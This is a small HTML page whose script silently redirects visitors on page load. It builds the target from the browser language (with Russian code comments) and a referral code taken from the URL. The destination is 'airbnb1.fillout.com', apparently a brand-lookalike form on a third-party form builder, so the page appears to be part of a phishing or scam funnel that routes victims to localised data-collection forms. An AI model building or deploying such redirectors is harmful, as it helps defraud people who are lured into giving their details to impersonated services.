<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('r') || '';

    const lang = (navigator.language || navigator.userLanguage || '').toLowerCase();

    const langMap = {
      'ru': 'rup',
      'hi': 'hip',
      'ar': 'arp',
      'he': 'hep',
      'tr': 'trp',
      'uk': 'ukp',
      'pl': 'plp',
      'zh': 'zhp',
      'ko': 'kop',
      'fr': 'frp',
      'de': 'dep',
      'cs': 'czp' // чешский
    };

    let redirectPath = 'enp'; // по умолчанию английский

    for (const key in langMap) {
      if (lang.startsWith(key)) {
        redirectPath = langMap[key];
        break;
      }
    }

    let targetUrl = 'https://airbnb1.fillout.com/' + redirectPath;

    if (code) {
      targetUrl += '?r=' + encodeURIComponent(code);
    }

    window.location.href = targetUrl;
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
